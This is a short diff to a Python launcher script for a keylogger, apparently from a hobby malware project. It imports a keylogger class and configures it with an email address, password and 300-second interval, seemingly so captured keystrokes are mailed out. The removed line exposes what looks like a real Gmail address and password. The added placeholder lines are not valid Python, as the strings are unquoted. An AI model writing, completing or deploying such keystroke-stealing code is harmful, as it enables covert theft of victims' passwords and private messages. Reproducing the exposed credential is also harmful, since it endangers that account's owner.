@@ -1,4 +1,6 @@
 #!/usr/bin/env python3
 import class_key_logger
-
-my_keylogger = class_key_logger.Keylogger(300,"prakash2raj4@gmail.com","Prakash@Raj1998")
+email = something123@something.com
+time_interval = 300 #time interval in second
+password = yourPass2word
+my_keylogger = class_key_logger.Keylogger(time_interval,email,password)
